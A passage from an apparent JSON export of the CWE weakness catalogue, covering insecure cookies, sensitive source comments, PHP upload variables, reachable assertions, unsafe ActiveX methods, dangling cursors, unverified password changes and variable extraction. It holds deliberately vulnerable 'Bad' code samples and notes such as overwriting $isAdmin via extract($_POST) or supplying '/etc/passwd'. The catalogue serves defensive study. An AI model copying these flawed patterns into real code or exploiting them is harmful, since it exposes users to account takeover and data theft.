          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Always set the secure attribute when the cookie should sent via HTTPS only."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The snippet of code below, taken from a servlet doPost() method, sets an accountID cookie (sensitive) without calling setSecure(true)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie c = new Cookie(ACCOUNT_ID, acctID);\n\tresponse.addCookie(c);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2004-0462",
          "Description": "A product does not set the Secure attribute for sensitive cookies in HTTPS sessions, which could cause the user agent to send those cookies in plaintext over an HTTP session with the product.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0462"
        },
        {
          "Reference": "CVE-2008-3663",
          "Description": "A product does not set the secure flag for the session cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3663"
        },
        {
          "Reference": "CVE-2008-3662",
          "Description": "A product does not set the secure flag for the session cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3662"
        },
        {
          "Reference": "CVE-2008-0128",
          "Description": "A product does not set the secure flag for a cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0128"
        }
      ],
      "RelatedAttackPatterns": [
        "102"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "615",
      "Name": "Inclusion of Sensitive Information in Source Code Comments",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.",
      "ExtendedDescription": "An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "540",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "546",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Distribution"
          ],
          "Description": "Remove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following comment, embedded in a JSP, will be displayed in the resulting HTML output."
            },
            {
              "Nature": "Bad",
              "Language": "JSP",
              "ExampleCode": "```\n\t<!-- FIXME: calling this with more than 30 args kills the JDBC server -->\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-6197",
          "Description": "Version numbers and internal hostnames leaked in HTML comments.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6197"
        },
        {
          "Reference": "CVE-2007-4072",
          "Description": "CMS places full pathname of server in HTML comment.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4072"
        },
        {
          "Reference": "CVE-2009-2431",
          "Description": "blog software leaks real username in HTML comment.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2431"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "616",
      "Name": "Incomplete Identification of Uploaded File Variables (PHP)",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.",
      "ExtendedDescription": "These global variables could be overwritten by POST requests, cookies, or other methods of populating or overwriting these variables. This could be used to read or process arbitrary files by providing values such as \"/etc/passwd\".",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "345",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "473",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Files or Directories",
            "Modify Files or Directories"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use PHP 4 or later."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If you must support older PHP versions, write your own version of is_uploaded_file() and run it against $HTTP_POST_FILES['userfile']))"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "For later PHP versions, reference uploaded files using the $HTTP_POST_FILES or $_FILES variables, and use is_uploaded_file() or move_uploaded_file() to ensure that you are dealing with an uploaded file."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "As of 2006, the \"four globals\" method is probably in sharp decline, but older PHP applications could have this issue."
            },
            {
              "BodyText": "In the \"four globals\" method, PHP sets the following 4 global variables (where \"varname\" is application-dependent):"
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$varname = name of the temporary file on local machine\n\t$varname_size = size of file\n\t$varname_name = original name of file provided by client\n\t$varname_type = MIME type of the file\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "\"The global $_FILES exists as of PHP 4.1.0 (Use $HTTP_POST_FILES instead if using an earlier version). These arrays will contain all the uploaded file information.\""
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$_FILES['userfile']['name'] - original filename from client\n\t$_FILES['userfile']['tmp_name'] - the temp filename of the file on the server\n```"
            },
            {
              "BodyText": "** note: 'userfile' is the field name from the web form; this can vary."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-1460",
          "Description": "Forum does not properly verify whether a file was uploaded or if the associated variables were set by POST, allowing remote attackers to read arbitrary files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1460"
        },
        {
          "Reference": "CVE-2002-1759",
          "Description": "Product doesn't check if the variables for an upload were set by uploading the file, or other methods such as $_POST.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1759"
        },
        {
          "Reference": "CVE-2002-1710",
          "Description": "Product does not distinguish uploaded file from other files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1710"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Incomplete Identification of Uploaded File Variables (PHP)"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-502",
          "Authors": [
            "Shaun Clowes"
          ],
          "Title": "A Study in Scarlet - section 5, \"File Upload\""
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "617",
      "Name": "Reachable Assertion",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.",
      "ExtendedDescription": "\n\nWhile assertion is good for catching logic errors and reducing the chances of reaching more serious vulnerability conditions, it can still lead to a denial of service.\n\n\nFor example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "assertion failure"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "An attacker that can trigger an assert statement can still lead to a denial of service if the relevant code can be triggered by an attacker, and if the scope of the assert() extends beyond the attacker's own session."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Make sensitive open/close operation non reachable by directly user-controlled data (e.g. open/close resources)"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "Perform input validation on user data."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-183",
          "Entries": [
            {
              "IntroText": "In the excerpt below, an AssertionError (an unchecked exception) is thrown if the user hasn't entered an email address in an HTML form."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString email = request.getParameter(\"email_address\");\n\tassert email != null;\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2023-49286",
          "Description": "Chain: function in web caching proxy does not correctly check a return value (CWE-253) leading to a reachable assertion (CWE-617)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2023-49286"
        },
        {
          "Reference": "CVE-2006-6767",
          "Description": "FTP server allows remote attackers to cause a denial of service (daemon abort) via crafted commands which trigger an assertion failure.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6767"
        },
        {
          "Reference": "CVE-2006-6811",
          "Description": "Chat client allows remote attackers to cause a denial of service (crash) via a long message string when connecting to a server, which causes an assertion failure.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6811"
        },
        {
          "Reference": "CVE-2006-5779",
          "Description": "Product allows remote attackers to cause a denial of service (daemon crash) via LDAP BIND requests with long authcid names, which triggers an assertion failure.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5779"
        },
        {
          "Reference": "CVE-2006-4095",
          "Description": "Product allows remote attackers to cause a denial of service (crash) via certain queries, which cause an assertion failure.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4095"
        },
        {
          "Reference": "CVE-2006-4574",
          "Description": "Chain: security monitoring product has an off-by-one error that leads to unexpected length values, triggering an assertion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4574"
        },
        {
          "Reference": "CVE-2004-0270",
          "Description": "Anti-virus product has assert error when line length is non-numeric.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0270"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET01-J",
          "EntryName": "Never use assertions to validate method arguments"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "618",
      "Name": "Exposed Unsafe ActiveX Method",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).",
      "ExtendedDescription": "ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "749",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If you must expose a method, make sure to perform input validation on all arguments, and protect against all possible vulnerabilities."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use code signing, although this does not protect against any weaknesses that are already in the control."
        },
        {
          "Phase": [
            "Architecture and Design",
            "System Configuration"
          ],
          "Description": "Where possible, avoid marking the control as safe for scripting."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-1120",
          "Description": "download a file to arbitrary folders.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1120"
        },
        {
          "Reference": "CVE-2006-6838",
          "Description": "control downloads and executes a url in a parameter",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6838"
        },
        {
          "Reference": "CVE-2007-0321",
          "Description": "resultant buffer overflow",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0321"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-503",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Developing Secure ActiveX Controls",
          "PublicationYear": "2005",
          "PublicationMonth": "04",
          "PublicationDay": "13",
          "URL": "https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 12, \"ActiveX Security\", Page 749",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "619",
      "Name": "Dangling Database Cursor ('Cursor Injection')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor \"dangling.\"",
      "ExtendedDescription": "For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "402",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary",
          "Description": "This could be primary when the programmer never attempts to close the cursor when finished with it."
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "SQL",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "A cursor is a feature in Oracle PL/SQL and other languages that provides a handle for executing and accessing the results of SQL queries."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This issue is currently reported for unhandled exceptions, but it is theoretically possible any time the programmer does not close the cursor at the proper time."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Close cursors immediately after access to them is complete. Ensure that you close cursors if exceptions occur."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-505",
          "Authors": [
            "David Litchfield"
          ],
          "Title": "The Oracle Hacker's Handbook"
        },
        {
          "ExternalReferenceID": "REF-506",
          "Authors": [
            "David Litchfield"
          ],
          "Title": "Cursor Injection",
          "URL": "http://www.davidlitchfield.com/cursor-injection.pdf",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "620",
      "Name": "Unverified Password Change",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.",
      "ExtendedDescription": "This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "When prompting for a password change, force the user to provide the original password in addition to the new password."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not use \"forgotten password\" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-56",
          "Entries": [
            {
              "IntroText": "This code changes a user's password."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$user = $_GET['user'];\n\t$pass = $_GET['pass'];\n\t$checkpass = $_GET['checkpass'];\n\tif ($pass == $checkpass) {\n\t\tSetUserPassword($user, $pass);\n\t}\n```"
            },
            {
              "BodyText": "While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0681",
          "Description": "Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0681"
        },
        {
          "Reference": "CVE-2000-0944",
          "Description": "Web application password change utility doesn't check the original password.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0944"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A3",
          "EntryName": "Broken Authentication and Session Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP31",
          "EntryName": "Missing authentication"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 19: Use of Weak Password-Based Systems.\" Page 279",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "621",
      "Name": "Variable Extraction Error",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.",
      "ExtendedDescription": "\n\nFor example, in PHP, extraction can be used to provide functionality similar to register_globals, a dangerous functionality that is frequently disabled in production systems. Calling extract() or import_request_variables() without the proper arguments could allow arbitrary global variables to be overwritten, including superglobals.\n\n\nSimilar functionality is possible in other interpreted languages, including custom languages.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "914",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "471",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Variable overwrite"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could modify sensitive data or program variables."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "Use allowlists of variable names that can be extracted."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Consider refactoring your code to avoid extraction routines altogether."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In PHP, call extract() with options such as EXTR_SKIP and EXTR_PREFIX_ALL; call import_request_variables() with a prefix argument. Note that these capabilities are not present in all PHP versions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-107",
          "Entries": [
            {
              "IntroText": "This code uses the credentials sent in a POST request to login a user."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n//Log user in, and set $isAdmin to true if user is an administrator* \n\t\n\tfunction login($user,$pass){\n\t```\n\t\t$query = buildQuery($user,$pass);\n\t\tmysql_query($query);\n\t\tif(getUserRole($user) == \"Admin\"){\n\t\t\t$isAdmin = true;\n\t\t}\n\t}\n\t$isAdmin = false;\n\textract($_POST);\n\tlogin(mysql_real_escape_string($user),mysql_real_escape_string($pass));\n```"
            },
            {
              "BodyText": "The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value \"isAdmin\" equal to \"true\", thus gaining Admin privileges."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-7135",
          "Description": "extract issue enables file inclusion",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7135"
        },
        {
          "Reference": "CVE-2006-7079",
          "Description": "Chain: PHP app uses extract for register_globals compatibility layer (CWE-621), enabling path traversal (CWE-22)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7079"
        },
        {
          "Reference": "CVE-2007-0649",
          "Description": "extract() buried in include files makes post-disclosure analysis confusing; original report had seemed incorrect.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0649"
        },
        {
          "Reference": "CVE-2006-6661",
          "Description": "extract() enables static code injection",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6661"
        },
        {
          "Reference": "CVE-2006-2828",
          "Description": "import_request_variables() buried in include files makes post-disclosure analysis confusing",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2828"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Probably under-reported for PHP. Seems under-studied for other interpreted languages."
        }
      ]
    },
    {
      "ID": "622",
      "Name": "Improper Validation of Function Hook Arguments",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product adds hooks to user-accessible API functions, but it does not properly validate the arguments. This could lead to resultant vulnerabilities.",
      "ExtendedDescription": "Such hooks can be used in defensive software that runs with privileges, such as anti-virus or firewall, which hooks kernel calls. When the arguments are not validated, they could be used to bypass the protection scheme or attack the product itself.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "20",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that all arguments are verified, as defined by the API you are protecting."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Drop privileges before invoking such functions, if possible."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0708",
          "Description": "DoS in firewall using standard Microsoft functions",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0708"
        },
        {
          "Reference": "CVE-2006-7160",
          "Description": "DoS in firewall using standard Microsoft functions",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7160"
        },
        {
          "Reference": "CVE-2007-1376",
          "Description": "function does not verify that its argument is the proper type, leading to arbitrary memory write",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1376"
        },
        {
